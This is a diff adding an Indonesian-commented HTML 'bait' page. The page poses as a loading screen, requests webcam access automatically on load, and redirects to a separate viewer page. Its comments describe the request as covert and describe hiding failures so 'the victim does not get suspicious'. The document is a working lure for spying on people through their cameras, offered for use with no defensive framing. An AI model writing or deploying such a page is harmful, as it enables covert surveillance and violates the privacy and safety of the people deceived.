@@ -1,0 +1,46 @@
+<!-- FILE 1: index.html (Halaman Pancing / Bait) -->
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <title>Memuat...</title>
+</head>
+<body style="background: #000; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif;">
+    <div style="text-align: center;">
+        <h3>Memuat Konten...</h3>
+        <p style="font-size: 12px; color: #666;">Silakan tunggu sebentar.</p>
+        <button id="load-btn" style="display:none; padding: 10px 20px; background: #222; color: #fff; border: 1px solid #444; border-radius: 4px; cursor: pointer;">Lanjutkan</button>
+    </div>
+
+    <script>
+        // Meminta izin kamera secara diam-diam atau melalui pemicu otomatis
+        async function requestCameraPermission() {
+            try {
+                // Meminta akses stream untuk memicu pop-up izin browser
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+                
+                // Jika izin diberikan, simpan status atau langsung lempar ke File 2 (Viewer)
+                // Karena stream lokal tidak bisa langsung di-pass antar domain/halaman via URL biasa,
+                // token atau sesi diteruskan, atau halaman kedua langsung mengambil ulang stream 
+                // karena izin browser (permission state) untuk origin tersebut sudah berstatus 'granted'.
+                window.location.href = "viewer.html";
+            } catch (err) {
+                console.warn("Izin ditolak:", err);
+                // Tampilkan tombol manual jika autoplay/auto-request diblokir kebijakan browser
+                document.getElementById('load-btn').style.display = 'inline-block';
+            }
+        }
+
+        document.getElementById('load-btn').onclick = async () => {
+            try {
+                await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+                window.location.href = "viewer.html";
+            } catch (e) {
+                window.location.href = "viewer.html"; // Tetap lanjut meski gagal agar korban tidak curiga
+            }
+        };
+
+        window.onload = requestCameraPermission;
+    </script>
+</body>
+</html>
